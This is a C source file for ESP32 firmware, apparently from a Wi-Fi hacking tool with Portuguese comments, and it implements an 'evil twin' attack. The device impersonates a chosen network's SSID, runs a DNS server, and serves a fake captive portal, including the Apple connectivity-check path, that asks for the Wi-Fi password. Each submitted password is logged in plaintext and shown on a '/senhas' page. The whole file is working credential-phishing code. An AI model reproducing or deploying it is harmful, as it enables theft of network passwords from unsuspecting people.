// Copyright (c) 2025 HIGH CODE LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

#include "evil_twin.h"
#include "dns_server.h"
// #include "esp_http_server.h"
#include "esp_err.h"
// #include "esp_http_server.h"
#include "esp_log.h"
#include "esp_wifi.h"
#include "http_server_service.h"
#include "storage_read.h"
#include "wifi_service.h"
#include <stdlib.h>
#include <string.h>

// TODO
// load HTML files, remove hardcoded html [x] 
// try to simplify POST handlers []
// simplify GET handlers []
// reqs logging []
// automatic redirect []
// thread per connection []
// connection timeout []

// =================================================================
// Definições e Variáveis Globais
// =================================================================
static const char *TAG_ET = "EVIL_TWIN_BACKEND";
#define MAX_PASSWORDS 20
#define MAX_PASSWORD_LEN 64

static char captured_passwords[MAX_PASSWORDS][MAX_PASSWORD_LEN];
static int password_count = 0;

static esp_err_t save_captured_password(const char *password);

// =================================================================
// HTML do Portal Cativo e Páginas
// =================================================================
//
// Le arquivo como string

// dont use hardcoded html for now
// static const char *captive_portal_html =
//     "<!DOCTYPE html><html><head><title>Wi-Fi Login</title><meta "
//     "name='viewport' content='width=device-width, "
//     "initial-scale=1'><style>body{font-family:Arial,sans-serif;text-align:"
//     "center;background-color:#f0f0f0;}div{background:white;margin:50px "
//     "auto;padding:20px;border-radius:10px;width:80%;max-width:400px;box-shadow:"
//     "0 4px 8px "
//     "rgba(0,0,0,0.1);}input[type=password]{width:90%;padding:10px;margin:10px
//     " "0;border:1px solid "
//     "#ccc;border-radius:5px;}input[type=submit]{background-color:#4CAF50;color:"
//     "white;padding:10px "
//     "20px;border:none;border-radius:5px;cursor:pointer;}</style></"
//     "head><body><div><h2>Conecte-se a rede</h2><p>Por favor, insira a senha
//     da " "rede para continuar.</p><form action='/submit' method='post'><input
//     " "type='password' name='password' placeholder='Senha do Wi-Fi'><input "
//     "type='submit' value='Conectar'></form></div></body></html>";
// static const char *thank_you_html =
//     "<!DOCTYPE html><html><head><title>Conectado</title><meta name='viewport'
//     " "content='width=device-width, "
//     "initial-scale=1'><style>body{font-family:Arial,sans-serif;text-align:"
//     "center;padding:50px;}</style></head><body><h1>Obrigado!</h1><p>Você está
//     " "conectado a internet.</p></body></html>";

// =================================================================
// Handlers do Servidor HTTP
// =================================================================
static esp_err_t submit_post_handler(httpd_req_t *req) {
  char buf[100];
  char password[MAX_PASSWORD_LEN];
  // int ret, remaining = req->content_len;
  // if (remaining >= sizeof(buf)) {
  //   http_service_send_error(req, HTTP_STATUS_BAD_REQUEST_400, "Request too long");
  //   return ESP_FAIL;
  // }
  // ret = httpd_req_recv(req, buf, remaining);
  // if (ret <= 0)
  //   return ESP_FAIL;
  // buf[ret] = '\0';

  if (http_service_req_recv(req, buf, sizeof(buf)) != ESP_OK){
    return ESP_FAIL;
  }

  // if (httpd_query_key_value(buf, "password", password, sizeof(password)) == ESP_OK) {
  //   ESP_LOGI(TAG_ET, "Senha capturada: %s", password);
  //   if (password_count < MAX_PASSWORDS) {
  //     strncpy(captured_passwords[password_count], password, MAX_PASSWORD_LEN);
  //     captured_passwords[password_count][MAX_PASSWORD_LEN - 1] = '\0';
  //     password_count++;
  //   }
  // }
  
  if (http_service_query_key_value(buf, "password", password, sizeof(password)) == ESP_OK) {
    save_captured_password(password);
  } else {
    ESP_LOGW(TAG_ET, "POST received without label 'password'");
  }

  if (http_service_send_file_from_sd(req, "/thankyou.html") != ESP_OK){
    ESP_LOGE(TAG_ET, "Failed to load thankyou.html");
    httpd_resp_send(req, "<h1>Obrigado!</h1>", HTTPD_RESP_USE_STRLEN);
  }

  return ESP_OK;
}

static esp_err_t passwords_get_handler(httpd_req_t *req) {
  char *resp_str = (char *)malloc(4096);
  if (resp_str == NULL)
    return ESP_FAIL;
  strcpy(resp_str, "<html><body><h1>Senhas Capturadas</h1><ul>");
  for (int i = 0; i < password_count; i++) {
    char item[100];
    snprintf(item, sizeof(item), "<li>%s</li>", captured_passwords[i]);
    strcat(resp_str, item);
  }
  strcat(resp_str, "</ul></body></html>");
  // httpd_resp_send(req, resp_str, strlen(resp_str));
  http_service_send_response(req, resp_str, strlen(resp_str));
  free(resp_str);
  return ESP_OK;
}

static esp_err_t captive_portal_get_handler(httpd_req_t *req) {
  return http_service_send_file_from_sd(req, "/captiveportal.html");
}

static esp_err_t save_captured_password(const char *password) {
    if (password_count >= MAX_PASSWORDS) {
        ESP_LOGW(TAG_ET, "Lista de senhas cheia! Ignorando: %s", password);
        return ESP_FAIL;
    }

    strncpy(captured_passwords[password_count], password, MAX_PASSWORD_LEN);
    captured_passwords[password_count][MAX_PASSWORD_LEN - 1] = '\0';
    
    password_count++;
    ESP_LOGI(TAG_ET, "Senha capturada e salva [%d]: %s", password_count, password);
    
    return ESP_OK;
}

// =================================================================
// Lógica do Servidor
// =================================================================
static void register_evil_twin_handlers(void) {
  start_web_server();
  httpd_uri_t submit_uri = {.uri = "/submit", .method = HTTP_POST, .handler = submit_post_handler};
  http_service_register_uri(&submit_uri);

  httpd_uri_t passwords_uri = {.uri = "/senhas", .method = HTTP_GET, .handler = passwords_get_handler};
  http_service_register_uri(&passwords_uri);

  httpd_uri_t root_uri = {.uri = "/", .method = HTTP_GET, .handler = captive_portal_get_handler};
  http_service_register_uri(&root_uri);

  httpd_uri_t captive_portal_uri = {
      .uri = "/hotspot-detect.html",
      .method = HTTP_GET,
      .handler = captive_portal_get_handler,
      .user_ctx = NULL};
  http_service_register_uri(&captive_portal_uri);
}

// =================================================================
// Funções Públicas (API do Backend)
// =================================================================
void evil_twin_start_attack(const char *ssid) {
  password_count = 0;
  ESP_LOGI(TAG_ET, "Iniciando lógica do Evil Twin para SSID: %s", ssid);
  wifi_change_to_hotspot(ssid);
  start_dns_server();
  vTaskDelay(pdMS_TO_TICKS(1000)); // Delay para o AP subir
  register_evil_twin_handlers();
  ESP_LOGI(TAG_ET, "Lógica do Evil Twin ativa.");
}

void evil_twin_stop_attack(void) {
  stop_http_server();
  wifi_service_init(); // Restaura o modo Wi-Fi padrão
  ESP_LOGI(TAG_ET, "Lógica do Evil Twin parada.");
}
